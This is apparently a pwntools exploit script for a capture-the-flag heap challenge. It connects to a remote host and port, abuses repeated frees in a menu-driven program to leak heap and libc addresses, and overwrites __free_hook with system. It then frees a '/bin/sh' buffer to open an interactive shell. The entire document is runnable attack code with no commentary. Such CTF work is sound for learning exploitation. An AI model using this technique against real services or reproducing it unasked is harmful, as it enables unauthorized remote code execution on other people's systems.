from pwn import *

elf = ELF("chall")
libc = ELF('libc-2.27.so')
r = remote('34.121.211.139', 4444)


def create(size, content):
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvline()
    r.sendline(size)
    r.recvline()
    r.sendline(content)


def delete():
    r.recvuntil('choice :')
    r.sendline('3')


def view():
    r.recvuntil('choice :')
    r.sendline('2')
    r.recvline()
    r.recvline()
    return r.recvline()[:-1]


create('62', 'A' * 62)

for i in range(4):
    delete()

heap_leak = u64(view().ljust(8, b'\x00'))
log.info("heap leak --> %s" % hex(heap_leak))

create('62', p64(0) + b'A' * 8)
create('62', 'A' * 8)

for i in range(4):
    create('62', p64(heap_leak) + p64(0x91) * 3)

delete()
delete()

create('62', p64(heap_leak + 0x60))
create('62', 'A' * 8)
create('62', 'A' * 8)

for i in range(8):
    delete()

libc_leak = u64(view().ljust(8, b'\x00'))

libc_base = libc_leak - 0x3ebca0
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

log.success("libc_base --> %s" % hex(libc_base))

create('8', 'A' * 8)

delete()
delete()

create('8', p64(free_hook))
create('8', p64(0))
create('8', p64(system))

create('8', '/bin/sh\x00')
delete()

r.interactive()
